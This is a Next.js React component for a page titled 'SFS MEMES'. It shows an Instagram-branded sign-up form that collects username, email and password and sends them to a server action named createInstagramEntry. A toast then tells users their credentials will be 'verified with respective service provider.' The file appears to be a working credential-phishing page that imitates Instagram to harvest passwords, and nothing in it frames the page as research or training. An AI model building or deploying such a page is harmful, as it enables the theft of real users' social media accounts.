"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import Link from "next/link";
import { createInstagramEntry } from "@/lib/actions/form.action";
import { FaInstagram } from "react-icons/fa6";
import toast from "react-hot-toast";

export default function LoginAccount() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [username, setUsername] = useState("");

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    const toastId = toast.loading("Loading...");
    try {
      // API call to backend
      const response = await createInstagramEntry(email, password, username);

      // Assuming response contains some success message or user data
      console.log(response);
      toast.success(
        "Will get confirmation after your credentials are verified with respective service provider"
      );
      setEmail("");
      setPassword("");
      setUsername("");
      // Further actions like redirecting the user or updating the UI
    } catch (err) {
      toast.error("Login failed: " + err);
    }
    toast.dismiss(toastId);
  };
  return (
    <div className="relative flex flex-col justify-center items-center min-h-screen overflow-hidden sm:p-24">
      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
          Get started by logging in&nbsp;
          {/* <code className="font-mono font-bold">app/page.tsx</code> */}
        </p>
        <div className="fixed bottom-0  left-0 hidden sm:flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
          <a
            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
            target="_blank"
            rel="noopener noreferrer"
          >
            By{" "}
            {/* <Image
              src="/vercel.svg"
              alt="Vercel Logo"
              className="dark:invert"
              width={100}
              height={24}
              priority
            /> */}
            <h1>Fellow Insiders</h1>
          </a>
        </div>
      </div>

      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3  flex-col after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
        {/* <Image
          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
          src="/next.svg"
          alt="Next.js Logo"
          width={180}
          height={37}
          priority
        /> */}
        <h1 className="text-[30px] font-bold leading-[42px] tracking-tighter">
          SFS MEMES
        </h1>
        <p>
          <b>~Sponsored</b> By Maria Das
        </p>
      </div>
      <div className="w-full m-auto bg-white lg:max-w-lg">
        <Card>
          <CardHeader className="space-y-1">
            <CardTitle className="text-2xl flex flex-row justify-center items-center gap-5 text-center">
              Sign Up <FaInstagram />
            </CardTitle>
            <CardDescription className="text-center">
              Enter your username , email and password to login
            </CardDescription>
          </CardHeader>
          <CardContent className="grid gap-4">
            <form onSubmit={handleSubmit} className="flex flex-col gap-5">
              <div className="grid gap-2">
                <Label htmlFor="username">User Name</Label>
                <Input
                  id="username"
                  type="username"
                  placeholder=""
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>
              <div className="grid gap-2">
                <Label htmlFor="email">Email</Label>
                <Input
                  id="email"
                  type="email"
                  placeholder=""
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              <div className="grid gap-2">
                <Label htmlFor="password">Password</Label>
                <Input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              {/* ... other parts of the form */}
              <Button type="submit" className="w-full">
                Login
              </Button>
            </form>
          </CardContent>
          <div className="relative mb-2">
            <div className="absolute inset-0 flex items-center">
              <span className="w-full border-t" />
            </div>
            <div className="relative flex justify-center text-xs uppercase">
              <span className="bg-background px-2 text-muted-foreground">
                Already have an account ?
              </span>
            </div>
          </div>

          <p className="mt-2 text-xs text-center text-gray-700 mb-2">
            {" "}
            Have an account?{" "}
            <Link href="/login" className=" text-blue-600 hover:underline">
              Login
            </Link>
          </p>
        </Card>
      </div>
    </div>
  );
}
